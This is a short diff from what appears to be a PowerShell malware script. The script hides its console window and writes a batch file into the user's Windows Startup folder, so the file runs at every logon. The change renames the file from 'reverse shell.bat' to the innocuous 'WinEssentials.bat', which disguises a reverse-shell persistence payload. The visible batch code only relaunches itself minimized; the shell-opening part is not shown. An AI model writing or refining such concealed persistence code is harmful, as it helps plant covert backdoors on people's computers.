@@ -10,7 +10,7 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 
 cd "./appdata/roaming/microsoft/windows/start menu/programs/startup"
 
-New-Item -Path . -Name "reverse shell.bat" -ItemType "file" -Value @"
+New-Item -Path . -Name "WinEssentials.bat" -ItemType "file" -Value @"
 @echo off
 if "%1"=="done" goto runtime
 start "" /min %0 done
